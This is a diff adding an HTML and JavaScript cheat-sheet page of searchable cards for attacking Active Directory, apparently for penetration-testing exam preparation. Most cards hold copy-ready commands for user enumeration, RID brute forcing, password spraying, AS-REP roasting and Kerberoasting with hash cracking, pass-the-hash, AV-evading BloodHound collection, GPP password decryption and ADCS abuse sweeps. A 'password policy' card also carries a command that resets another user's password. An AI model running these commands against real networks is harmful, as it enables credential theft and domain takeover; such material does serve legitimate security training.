+        <text class="node-text" x="870" y="292">password policy + lockout</text>
+        <text class="node-sub" x="870" y="305">before any spraying</text></a>
+      <path class="arrow" d="M 870 310 L 870 325"/>
+
+      <a href="#card-bloodhound-coll"><rect class="node-rect abuse" x="680" y="325" width="380" height="40"/>
+        <text class="node-text" x="870" y="347">bloodhound-python -c All</text>
+        <text class="node-sub" x="870" y="360">from Kali (no SharpHound on host)</text></a>
+      <path class="arrow" d="M 870 365 L 870 380"/>
+
+      <a href="#card-kerberoast-list"><rect class="node-rect abuse" x="680" y="380" width="380" height="40"/>
+        <text class="node-text" x="870" y="402">GetUserSPNs --request</text>
+        <text class="node-sub" x="870" y="415">kerberoastable accounts</text></a>
+      <path class="arrow" d="M 870 420 L 870 435"/>
+
+      <a href="#card-shares-spider"><rect class="node-rect enum" x="680" y="435" width="380" height="40"/>
+        <text class="node-text" x="870" y="457">cme smb spider_plus + sysvol</text>
+        <text class="node-sub" x="870" y="470">cleartext creds in scripts/configs</text></a>
+      <path class="arrow" d="M 870 475 L 870 490"/>
+
+      <a href="#card-certipy-find"><rect class="node-rect abuse" x="680" y="490" width="380" height="24"/>
+        <text class="node-text" x="870" y="507">certipy find -vulnerable (ADCS)</text></a>
+
+      <text class="label" x="550" y="535" style="font-size:10px; fill:#5fd49b">⚑ enumeration is the answer when you're stuck</text>
+    </svg>
+  </div>
+</section>
+
+<!-- ============================================================
+     CARDS
+     ============================================================ -->
+<section id="cards" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ALL ]</span>
+      <span class="flow-title">TRIGGER CARDS · SEARCHABLE</span>
+    </div>
+    <div class="flow-trigger">
+      <strong>⌘K</strong> to search · click diagram nodes to jump
+    </div>
+  </div>
+
+  <div class="filters">
+    <span class="filter-label">FILTER:</span>
+    <button class="pill active" data-filter="all">ALL <span class="pill-count" id="count-all">0</span></button>
+    <button class="pill" data-filter="setup">SCAN <span class="pill-count" id="count-setup">0</span></button>
+    <button class="pill" data-filter="enum">ENUM <span class="pill-count" id="count-enum">0</span></button>
+    <button class="pill" data-filter="abuse">QUERY <span class="pill-count" id="count-abuse">0</span></button>
+    <button class="pill" data-filter="state-user">AUTH'D <span class="pill-count" id="count-state-user">0</span></button>
+    <button class="pill" data-filter="state-admin">UNAUTH <span class="pill-count" id="count-state-admin">0</span></button>
+  </div>
+
+  <div id="results"></div>
+</section>
+
+<!-- ============================================================
+     ANTI-PATTERNS
+     ============================================================ -->
+<section id="anti" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ⚠ ]</span>
+      <span class="flow-title" style="color:var(--warn)">ANTI-PATTERNS · DON'T DO THIS</span>
+    </div>
+  </div>
+
+  <div class="anti-list">
+    <div class="anti">
+      <div class="anti-bad">Skip kerbrute because you "already have a user list"</div>
+      <div class="anti-fix">kerbrute validates which usernames actually exist in AD. enum4linux gives you guesses; kerbrute filters them. Always validate before spraying.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Spray passwords before checking lockout policy</div>
+      <div class="anti-fix"><code>cme smb &lt;DC&gt; -u U -p P --pass-pol</code> first. Lock out a domain admin and you'll be debugging timeouts for 30 minutes.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Run SharpHound on a target Windows host</div>
+      <div class="anti-fix"><code>bloodhound-python</code> from Kali through your pivot. No disk artifacts, no AV signature, faster.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Skip RID brute because SMB null "didn't return users"</div>
+      <div class="anti-fix">SMB enum has different paths. <code>rpcclient -U "" -N</code> → <code>lookupsids</code> often works when <code>enumdomusers</code> fails. Try both.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Ignore the description field on user accounts</div>
+      <div class="anti-fix">Half the time it contains "default password: Welcome2024". <code>ldapdomaindump</code> dumps these. Read every one.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Run BloodHound and not actually look at the data</div>
+      <div class="anti-fix">Open Neo4j. Run "Find Shortest Path to Domain Admins" from owned. Pre-built queries answer 70% of "what now?" questions.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Skip ADCS enum because "it's complicated"</div>
+      <div class="anti-fix"><code>certipy find -vulnerable -u U -p P -dc-ip DC</code> tells you in 5 seconds if there's an ESC1/ESC8 path to DA. One command.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Stop enumerating after foothold</div>
+      <div class="anti-fix">First thing on a new host: <code>cme smb localhost -u U -p P --shares</code>, hunt unattend.xml, dump cmdkey. Foothold ≠ done with enum.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Read smbclient share listings, skip mounting them</div>
+      <div class="anti-fix">Many shares list as "no access" but allow file reads on specific paths. Try <code>smbclient //IP/Share -N</code> directly. Sysvol especially.</div>
+    </div>
+    <div class="anti">
+      <div class="anti-bad">Forget GPP cpassword in SYSVOL</div>
+      <div class="anti-fix">It's 2008-era and still on exams. <code>find /sysvol -name Groups.xml</code> → <code>gpp-decrypt</code>. Free DA password sometimes.</div>
+    </div>
+  </div>
+</section>
+
+<div class="foot-info">
+  <div>KEY → <code>⌘/Ctrl+K</code> focus search · <code>ESC</code> clear · click cards in checklist to mark · click diagram nodes to jump</div>
+  <div style="margin-top:8px">phases: <span style="color:var(--setup)">SCAN</span> · <span style="color:var(--enum)">ENUM</span> · <span style="color:var(--abuse)">QUERY</span></div>
+  <div style="margin-top:8px; opacity:0.6">v1 · ad enumeration focus · companion to privesc + pivot banks</div>
+</div>
+
+</main>
+
+<script>
+const patterns = [
+  // ============= SCAN =============
+  {
+    id: 'nmap-full',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'Full TCP + AD-relevant UDP scan',
+    triggers: ['nmap', 'port scan', 'all ports', 'full scan', 'tcp', 'udp', '88', '389', '445'],
+    action: 'Two-phase nmap: fast full TCP first, then service detection on found ports only. Never skip UDP for AD — port 88 (kerberos) and 389 (LDAP) responses confirm DC.',
+    cmd: `# 1. Fast full TCP
+sudo nmap -p- --min-rate 5000 -T4 <IP> -oN tcp-fast.nmap
+
+# 2. Service detect on open ports
+ports=$(grep ^[0-9] tcp-fast.nmap | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//')
+sudo nmap -sC -sV -p$ports <IP> -oN tcp-deep.nmap
+
+# 3. AD-relevant UDP
+sudo nmap -sU -p53,88,123,137,161,389,500 <IP> -oN udp.nmap`,
+    cleanup: '',
+    related: ['smb-null', 'ldap-anon']
+  },
+  {
+    id: 'creds-check',
+    phase: 'setup', state: 'admin', tags: [],
+    title: '"Do I have creds yet?" branch',
+    triggers: ['no creds', 'have creds', 'starting state', 'where to start'],
+    action: 'Mental branch point. NO creds → unauth flow (smb null, kerbrute, RID, AS-REP). HAVE creds → cme validate, then BloodHound. Don\'t mix — finish the unauth list before assuming you need creds.',
+    cmd: `# Quick credless check matrix:
+crackmapexec smb <IP> -u '' -p ''
+crackmapexec smb <IP> -u 'guest' -p ''
+ldapsearch -x -H ldap://<IP> -s base namingcontexts
+rpcclient -U "" -N <IP> -c "enumdomusers"`,
+    cleanup: '',
+    related: ['smb-null', 'cme-validate']
+  },
+
+  // ============= UNAUTH SMB / LDAP / RPC =============
+  {
+    id: 'smb-null',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'SMB null session + enum4linux-ng',
+    triggers: ['smb null', 'null session', 'enum4linux', 'smbclient -L', 'anonymous smb', '445'],
+    action: 'First thing against 445. Sometimes returns the full domain user list. enum4linux-ng is the modern rewrite — faster, JSON output, doesn\'t crash on weird ACLs.',
+    cmd: `# Quick
+smbclient -L //<IP>/ -N
+crackmapexec smb <IP> -u '' -p '' --shares
+crackmapexec smb <IP> -u '' -p '' --users
+
+# Deep (parse everything)
+enum4linux-ng -A <IP> | tee enum4linux.txt
+
+# Save output for later
+echo "<IP>  <DOMAIN>.local <DC-NAME>.<DOMAIN>.local <DC-NAME>" | sudo tee -a /etc/hosts`,
+    cleanup: '',
+    related: ['rpc-null', 'ldap-anon']
+  },
+  {
+    id: 'ldap-anon',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'LDAP anonymous bind',
+    triggers: ['ldap', 'ldapsearch', 'anonymous bind', '389', 'naming context'],
+    action: 'Even when bind succeeds, returned data is usually minimal — but defaultNamingContext gives you the domain DN exactly (use in later authenticated queries). Sometimes anonymous users/computers come back too.',
+    cmd: `# RootDSE — always works
+ldapsearch -x -H ldap://<IP> -s base namingcontexts
+
+# Try anonymous bind for users
+ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local" "(objectClass=user)" | grep sAMAccountName
+
+# Full anon dump (rarely works fully)
+ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local" > ldap-anon.txt`,
+    cleanup: '',
+    related: ['smb-null', 'ldap-authed']
+  },
+  {
+    id: 'rpc-null',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'RPC null → enumdomusers + RID brute',
+    triggers: ['rpc null', 'rpcclient', 'enumdomusers', 'rid brute', 'lookupsids', '135'],
+    action: 'When SMB null is half-blocked, RPC null often still gives you the user list via different mechanism. RID cycling enumerates SIDs 500–5000 and resolves to names.',
+    cmd: `# Connect anonymous
+rpcclient -U "" -N <IP>
+
+# Inside rpcclient:
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+rpcclient $> querydominfo
+rpcclient $> lookupnames administrator
+
+# RID brute one-liner
+for i in $(seq 500 2000); do
+  rpcclient -U "" -N <IP> -c "lookupsids S-1-5-21-XXX-XXX-XXX-$i" 2>/dev/null
+done
+
+# Or with cme
+crackmapexec smb <IP> -u '' -p '' --rid-brute 4000`,
+    cleanup: '',
+    related: ['smb-null', 'kerbrute']
+  },
+  {
+    id: 'kerbrute',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'kerbrute userenum (88/UDP, no creds)',
+    triggers: ['kerbrute', 'user enum', 'userenum', 'kerberos enum', 'validate users', 'pre-auth'],
+    action: 'Validates which usernames exist in AD via Kerberos pre-auth responses. NO CREDS NEEDED. Fast, accurate, low-noise. The "is this name real?" oracle.',
+    cmd: `# Need a wordlist — start with statistically-likely-AD
+# /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+# Or your enum4linux output, or jsmith.txt format
+
+kerbrute userenum -d corp.local --dc <DC-IP> users.txt -o valid-users.txt
+
+# If you have firstname.lastname, generate:
+# python3 username-anarchy --input-format first.last names.txt`,
+    cleanup: '',
+    related: ['rpc-null', 'asrep-list']
+  },
+
+  // ============= PRE-AUTH KERBEROS WINS =============
+  {
+    id: 'asrep-list',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'GetNPUsers — AS-REP roastable list',
+    triggers: ['asrep', 'as-rep', 'asreproast', 'getnpusers', 'no pre-auth', 'pre-auth disabled'],
+    action: 'Asks every user "do you have pre-auth disabled?". Each user that answers YES coughs up a roastable hash. Credless attack — only needs the user list.',
+    cmd: `# Test specific users (no creds needed)
+GetNPUsers.py corp.local/ -no-pass -usersfile valid-users.txt \\
+  -dc-ip <DC-IP> -format hashcat -outputfile asrep-hashes.txt
+
+# Crack
+hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# Alternative: impacket-asrep
+impacket-GetNPUsers corp.local/ -no-pass -usersfile valid-users.txt`,
+    cleanup: '',
+    related: ['kerberoast-list', 'spray-known']
+  },
+  {
+    id: 'spray-known',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'Spray known / weak passwords vs user list',
+    triggers: ['spray', 'password spray', 'weak password', 'season password', 'company name pwd'],
+    action: 'After getting the user list, spray ~5 obvious passwords. Hits ~30% of the time. ALWAYS check lockout first (cards: passpol). Spray slow if threshold ≤5.',
+    cmd: `# Lockout check (CRITICAL)
+crackmapexec smb <DC-IP> -u '' -p '' --pass-pol
+
+# Common spray list (one per file or inline)
+echo -e "Password1\\nWelcome1\\nWelcome2024\\nSummer2024!\\n<CompanyName>1" > pwds.txt
+
+# Spray ONE pwd against all users (rotate, don't spray all pwds at once)
+crackmapexec smb <DC-IP> -u valid-users.txt -p 'Welcome2024' --continue-on-success
+
+# Show only hits
+crackmapexec smb <DC-IP> -u valid-users.txt -p 'Welcome2024' --continue-on-success | grep '\\[+\\]'`,
+    cleanup: '',
+    related: ['passpol', 'asrep-list']
+  },
+
+  // ============= AUTHENTICATED =============
+  {
+    id: 'cme-validate',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'cme validate — where do these creds work?',
+    triggers: ['cme', 'crackmapexec', 'netexec', 'nxc', 'validate creds', 'pwn3d'],
+    action: 'Sweep all hosts with your creds. "[+]" = creds valid · "(Pwn3d!)" = local admin. The Pwn3d markers tell you exactly where to lateral.',
+    cmd: `# SMB (most useful)
+crackmapexec smb <range or hosts.txt> -u <user> -p '<pwd>'
+
+# WinRM (5985)
+crackmapexec winrm <range> -u <user> -p '<pwd>'
+
+# Pass-the-hash variant
+crackmapexec smb <range> -u <user> -H <NT_HASH>
+
+# Note: netexec (nxc) is the maintained fork
+nxc smb <range> -u <user> -p '<pwd>'`,
+    cleanup: '',
+    related: ['passpol', 'shares-spider']
+  },
+  {
+    id: 'passpol',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'Password policy + lockout threshold',
+    triggers: ['password policy', 'lockout', 'pass-pol', 'pass pol', 'threshold', 'complexity'],
+    action: 'Critical pre-spray check. Lockout threshold of 5 means you have 4 tries per user before flagging. Threshold 0 = unlimited (rare). Min length and complexity inform crack viability.',
+    cmd: `# Authenticated (cleaner output)
+crackmapexec smb <DC-IP> -u <user> -p '<pwd>' --pass-pol
+
+# Unauthenticated (sometimes works)
+crackmapexec smb <DC-IP> -u '' -p '' --pass-pol
+
+# rpcclient method
+rpcclient -U <user>%<pwd> <DC-IP> -c "getdompwinfo"
+
+# net rpc method
+net rpc password "victim" "newpass" -U "<user>%<pwd>" -S <DC-IP>`,
+    cleanup: '',
+    related: ['spray-known', 'cme-validate']
+  },
+  {
+    id: 'ldap-authed',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'Authenticated LDAP dump',
+    triggers: ['ldap', 'ldapdomaindump', 'windapsearch', 'authenticated ldap', 'users groups computers'],
+    action: 'Authenticated LDAP gives you EVERYTHING — every user, group, computer, OU, GPO link, description field. ldapdomaindump writes neat HTML + JSON for grep.',
+    cmd: `# Dump all (HTML + JSON output in cwd)
+ldapdomaindump -u 'corp\\\\<user>' -p '<pwd>' <DC-IP>
+
+# Or windapsearch with named queries
+windapsearch -d corp.local --dc-ip <DC-IP> -u corp\\\\<user> -p '<pwd>' -m users
+windapsearch ... -m unconstrained-computers
+windapsearch ... -m admin-objects
+
+# Quick grep for cred clues in description field
+grep -i 'pass\\|pwd\\|cred' domain_users.html
+
+# Hunt for kerberoastable (servicePrincipalName set)
+ldapsearch -x -H ldap://<DC-IP> -b "DC=corp,DC=local" \\
+  -D '<user>@corp.local' -w '<pwd>' \\
+  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName`,
+    cleanup: '',
+    related: ['bloodhound-coll', 'kerberoast-list']
+  },
+
+  // ============= BLOODHOUND =============
+  {
+    id: 'bloodhound-coll',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'BloodHound collection — from Kali, not target',
+    triggers: ['bloodhound', 'bloodhound-python', 'sharphound', 'collection', 'ingestor', 'neo4j'],
+    action: 'Never run SharpHound on the target — disk artifacts + AV. Use bloodhound-python from Kali (works through ligolo). Collect everything once: -c All.',
+    cmd: `# Start neo4j first (one-time)
+sudo neo4j console &
+# Browser: localhost:7474 → set password
+# Launch BH GUI: bloodhound
+
+# Collect (from Kali — works through ligolo)
+bloodhound-python -u <user> -p '<pwd>' \\
+  -ns <DC-IP> -d corp.local -c All --zip
+
+# Pass-the-hash variant
+bloodhound-python -u <user> --hashes :<NT_HASH> \\
+  -ns <DC-IP> -d corp.local -c All --zip
+
+# Drag .zip into BH GUI → ingest`,
+    cleanup: 'rm *.json *.zip after exam',
+    related: ['bh-queries', 'kerberoast-list']
+  },
+  {
+    id: 'bh-queries',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'BloodHound — the queries that matter',
+    triggers: ['bloodhound queries', 'shortest path', 'find kerberoastable', 'cypher', 'pre-built'],
+    action: 'After ingest, mark your user as Owned (right-click → Mark User as Owned). Then run these in order — they answer "what now?" 80% of the time.',
+    cmd: `# Pre-built queries (Analysis tab in GUI):
+# 1. Shortest Paths to Domain Admins
+# 2. Shortest Paths from Owned Principals
+# 3. Find AS-REP Roastable Users
+# 4. Find Kerberoastable Users
+# 5. Find Computers with Unconstrained Delegation
+# 6. List all Kerberoastable Accounts
+
+# Custom Cypher (paste in BH search bar):
+# Find all paths from any Kerberoastable user to DA:
+MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p
+
+# Find users with description containing password hints:
+MATCH (u:User) WHERE u.description =~ '(?i).*pass.*' RETURN u.name, u.description`,
+    cleanup: '',
+    related: ['bloodhound-coll', 'kerberoast-list']
+  },
+
+  // ============= KERBEROAST + ACCOUNTS =============
+  {
+    id: 'kerberoast-list',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'GetUserSPNs — kerberoastable accounts',
+    triggers: ['kerberoast', 'getuserspns', 'spn', 'service account', 'tgs hash'],
+    action: 'Lists all accounts with an SPN set (service accounts). Add --request to get the actual TGS hashes for cracking. One command = list + harvest.',
+    cmd: `# List only (no hash request)
+GetUserSPNs.py -dc-ip <DC-IP> corp.local/<user>:'<pwd>'
+
+# List + harvest hashes
+GetUserSPNs.py -dc-ip <DC-IP> corp.local/<user>:'<pwd>' \\
+  -request -outputfile kerb-hashes.txt
+
+# Pass-the-hash variant
+GetUserSPNs.py -dc-ip <DC-IP> corp.local/<user> \\
+  -hashes :<NT> -request
+
+# Crack
+hashcat -m 13100 kerb-hashes.txt /usr/share/wordlists/rockyou.txt --force`,
+    cleanup: '',
+    related: ['asrep-list', 'bh-queries']
+  },
+
+  // ============= SHARES =============
+  {
+    id: 'shares-spider',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'Share enumeration + spider for creds',
+    triggers: ['shares', 'smb shares', 'spider_plus', 'sysvol', 'netlogon', 'find creds in files'],
+    action: 'Step 1: list shares with --shares. Step 2: spider readable shares for cleartext creds. Sysvol + Netlogon always readable by any domain user — check first.',
+    cmd: `# 1. List all shares + access
+crackmapexec smb <range> -u <user> -p '<pwd>' --shares
+
+# 2. Mount-and-grep approach
+smbclient //<host>/<share> -U corp/<user>%'<pwd>'
+# (inside smbclient): recurse on; prompt off; mget *
+
+# 3. cme spider_plus (best for "find passwords in files")
+crackmapexec smb <host> -u <user> -p '<pwd>' \\
+  -M spider_plus -o EXCLUDE_EXTS=ico,lnk DEPTH=5
+
+# 4. Always check Sysvol for GPP
+smbclient //<DC>/SYSVOL -U corp/<user>%'<pwd>'
+# look for Groups.xml — gpp-decrypt the cpassword`,
+    cleanup: '',
+    related: ['ldap-authed', 'gpp-decrypt']
+  },
+  {
+    id: 'gpp-decrypt',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'GPP cpassword (Groups.xml in SYSVOL)',
+    triggers: ['gpp', 'groups.xml', 'cpassword', 'sysvol creds', 'scheduledtasks.xml', 'services.xml'],
+    action: 'Legacy GPO password storage. The AES key was published by MS — decryption is trivial. Still on exams in 2026. Hunt every XML in SYSVOL.',
+    cmd: `# Mount sysvol
+mkdir /mnt/sysvol
+sudo mount -t cifs //\\<DC\\>/SYSVOL /mnt/sysvol \\
+  -o user=<user>,pass='<pwd>',dom=corp
+
+# Find candidate files
+find /mnt/sysvol -name 'Groups.xml' -o -name 'Services.xml' \\
+  -o -name 'ScheduledTasks.xml' -o -name 'DataSources.xml'
+
+# Extract + decrypt cpassword
+grep -r cpassword /mnt/sysvol/
+gpp-decrypt '<cpassword-value>'
+
+# Or fully automated:
+crackmapexec smb <DC> -u <user> -p '<pwd>' -M gpp_password`,
+    cleanup: 'sudo umount /mnt/sysvol',
+    related: ['shares-spider']
+  },
+
+  // ============= ADCS =============
+  {
+    id: 'certipy-find',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'certipy find — ADCS misconfig sweep',
+    triggers: ['adcs', 'certipy', 'esc1', 'esc8', 'certificate template', 'pki', 'ca'],
+    action: 'One command lists every cert template in the domain and flags vulnerable ESC patterns (ESC1, ESC2, ESC4, ESC8, ESC15…). If any are flagged, you likely have a direct path to DA.',
+    cmd: `# Full sweep + filter to vulnerable
+certipy find -u <user>@corp.local -p '<pwd>' \\
+  -dc-ip <DC-IP> -vulnerable -stdout
+
+# Save full output (text + JSON)
+certipy find -u <user>@corp.local -p '<pwd>' \\
+  -dc-ip <DC-IP> -text -output certipy-out
+
+# What to look for:
+# [!] Vulnerabilities: ESC1, ESC8, etc.
+# → templates allowing SAN with low-priv enrollment = ESC1
+# → web enrollment endpoint with NTLM = ESC8 (relay)`,
+    cleanup: '',
+    related: ['bh-queries', 'kerberoast-list']
+  },
+
+  // ============= MISC =============
+  {
+    id: 'description-hunt',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'Description field hunt (low-effort, high-yield)',
+    triggers: ['description', 'user description', 'attribute', 'password in field', 'comment'],
+    action: 'AD admins leave passwords in user description fields constantly. One LDAP query reveals them. Read every description.',
+    cmd: `# Cypher in BloodHound:
+MATCH (u:User) WHERE u.description IS NOT NULL
+RETURN u.name, u.description ORDER BY u.name
+
+# Direct LDAP query:
+ldapsearch -x -H ldap://<DC> -b "DC=corp,DC=local" \\
+  -D '<user>@corp.local' -w '<pwd>' \\
+  "(&(objectClass=user)(description=*))" \\
+  sAMAccountName description
+
+# Authenticated parse with windapsearch
+windapsearch -d corp.local --dc-ip <DC-IP> \\
+  -u corp\\\\<user> -p '<pwd>' --custom \\
+  "(&(objectClass=user)(description=*))" \\
+  --attrs sAMAccountName,description`,
+    cleanup: '',
+    related: ['ldap-authed']
+  },
+  {
+    id: 'trust-enum',
+    phase: 'enum', state: 'user', tags: [],
+    title: 'Domain trust enumeration',
+    triggers: ['trust', 'forest', 'nltest', 'domain trust', 'cross-domain'],
+    action: 'OSCP exam rarely involves cross-forest, but identifying trusts is a free check. Useful on Pro Labs and real engagements.',
+    cmd: `# From a Windows shell
+nltest /domain_trusts
+nltest /trusted_domains
+
+# From Kali via impacket
+impacket-getTGT corp.local/<user>:'<pwd>'
+# Then: lookupsid against other domain SIDs
+
+# BloodHound query
+MATCH (n:Domain)-[r:TrustedBy]->(m:Domain) RETURN n,r,m`,
+    cleanup: '',
+    related: ['bh-queries']
+  },
+];
+
+// ============================================================
+// PHASE LABELS
+// ============================================================
+const phaseOrder = ['setup', 'access', 'enum', 'abuse', 'win'];
+const phaseLabels = {
+  setup: 'SCAN',
+  access: 'ACCESS',
+  enum: 'ENUM',
+  abuse: 'QUERY',
+  win: 'WIN'
+};
+
+// ============================================================
+// RENDERING (shared with sibling banks)
+// ============================================================
+const $ = (sel) => document.querySelector(sel);
+const searchEl = $('#search');
+const resultsEl = $('#results');
+const filterBtns = document.querySelectorAll('.pill');
+let activeFilter = 'all';
+let query = '';
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+  }[c]));
+}
+function highlight(text, q) {
+  if (!q) return escapeHtml(text);
+  const escaped = escapeHtml(text);
+  const terms = q.split(/\s+/).filter(t => t.length > 0).map(t =>
+    t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+  if (!terms.length) return escaped;
+  const re = new RegExp(`(${terms.join('|')})`, 'gi');
+  return escaped.replace(re, '<mark>$1</mark>');
+}
+function matchesQuery(p, q) {
+  if (!q) return true;
+  const haystack = [p.title, p.action, p.cmd, p.triggers.join(' '), (p.tags||[]).join(' '), p.id].join(' ').toLowerCase();
+  const terms = q.toLowerCase().split(/\s+/).filter(t => t.length > 0);
+  return terms.every(t => haystack.includes(t));
+}
+function matchesFilter(p, f) {
+  if (f === 'all') return true;
+  if (f === 'state-user') return p.state === 'user' || p.state === 'both';
+  if (f === 'state-admin') return p.state === 'admin' || p.state === 'both';
+  return p.phase === f;
+}
+function renderCard(p, q) {
+  const triggersHTML = p.triggers.map(t => {
+    const isMatch = q && q.toLowerCase().split(/\s+/).some(qt => qt.length > 0 && t.toLowerCase().includes(qt));
+    return `<span class="trigger ${isMatch ? 'match' : ''}">${escapeHtml(t)}</span>`;
+  }).join('');
+  const cmdHTML = p.cmd ? `<div class="cmd-wrap"><pre class="cmd">${highlight(p.cmd, q)}</pre><button class="cmd-copy" data-cmd="${encodeURIComponent(p.cmd)}">COPY</button></div>` : '';
+  const cleanupHTML = p.cleanup ? `<div class="cleanup"><span class="cleanup-label">CLEANUP</span>${escapeHtml(p.cleanup)}</div>` : '';
+  const stateLabel = {
+    user: '<span class="state-tag user">AUTH\'D</span>',
+    admin: '<span class="state-tag admin">UNAUTH OK</span>',
+    both: '<span class="state-tag both">EITHER</span>'
+  }[p.state] || '';
+  return `<article class="card" data-phase="${p.phase}" data-state="${p.state}" id="card-${p.id}">
+    <div class="card-head"><div class="card-title">${highlight(p.title, q)}</div><span class="card-cat">${phaseLabels[p.phase]}</span></div>
+    <div class="triggers">${triggersHTML}</div>
+    <div class="arrow-line"><span class="arrow">→</span><span class="action">${highlight(p.action, q)}</span></div>
+    ${cmdHTML}${cleanupHTML}
+    <div class="card-foot">${stateLabel}</div>
+  </article>`;
+}
+function render() {
+  const filtered = patterns.filter(p => matchesFilter(p, activeFilter) && matchesQuery(p, query));
+  $('#resultCount').textContent = filtered.length;
+  if (filtered.length === 0) {
+    resultsEl.innerHTML = `<div class="empty"><div class="empty-icon">⌬</div><div class="empty-title">no patterns match</div><div class="empty-hint">try: 'bloodhound', 'kerbrute', 'asrep', 'spray', 'shares'</div></div>`;
+    return;
+  }
+  let html = '';
+  if (activeFilter === 'all' && !query) {
+    phaseOrder.forEach(ph => {
+      const inPh = filtered.filter(p => p.phase === ph);
+      if (!inPh.length) return;
+      html += `<div style="margin: 18px 0 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.2em;">▸ ${phaseLabels[ph]} <span style="opacity:0.5">[${inPh.length}]</span></div>`;
+      html += `<div class="grid">${inPh.map(p => renderCard(p, query)).join('')}</div>`;
+    });
+  } else {
+    html = `<div class="grid">${filtered.map(p => renderCard(p, query)).join('')}</div>`;
+  }
+  resultsEl.innerHTML = html;
+  resultsEl.querySelectorAll('.cmd-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      const cmd = decodeURIComponent(btn.dataset.cmd);
+      try {
+        await navigator.clipboard.writeText(cmd);
+        btn.textContent = 'COPIED';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+      } catch (err) { btn.textContent = 'ERR'; }
+    });
+  });
+}
+function updateCounts() {
+  $('#totalCount').textContent = patterns.length;
+  $('#count-all').textContent = patterns.length;
+  phaseOrder.forEach(ph => {
+    const c = patterns.filter(p => p.phase === ph).length;
+    const el = document.getElementById(`count-${ph}`);
+    if (el) el.textContent = c;
+  });
+  const userEl = document.getElementById('count-state-user');
+  const adminEl = document.getElementById('count-state-admin');
+  if (userEl) userEl.textContent = patterns.filter(p => p.state === 'user' || p.state === 'both').length;
+  if (adminEl) adminEl.textContent = patterns.filter(p => p.state === 'admin' || p.state === 'both').length;
+}
+searchEl.addEventListener('input', (e) => { query = e.target.value.trim(); render(); });
+filterBtns.forEach(btn => {
+  btn.addEventListener('click', () => {
+    activeFilter = btn.dataset.filter;
+    filterBtns.forEach(b => b.classList.toggle('active', b === btn));
+    render();
+    document.getElementById('cards').scrollIntoView({behavior: 'smooth', block: 'start'});
+  });
+});
+document.addEventListener('keydown', (e) => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); searchEl.focus(); searchEl.select(); }
+  if (e.key === 'Escape' && document.activeElement === searchEl) { searchEl.value = ''; query = ''; render(); searchEl.blur(); }
+});
+document.querySelectorAll('.diagram svg a').forEach(a => {
+  a.addEventListener('click', (e) => {
+    const href = a.getAttribute('href');
+    if (!href || !href.startsWith('#card-')) return;
+    setTimeout(() => {
+      const target = document.querySelector(href);
+      if (target) { target.classList.remove('flash'); void target.offsetWidth; target.classList.add('flash'); }
+    }, 100);
+  });
+});
+// checklist toggle
+document.querySelectorAll('.checklist li').forEach(li => {
+  li.addEventListener('click', () => li.classList.toggle('done'));
+});
+updateCounts();
+render();
+</script>
+
+</body>
+</html>
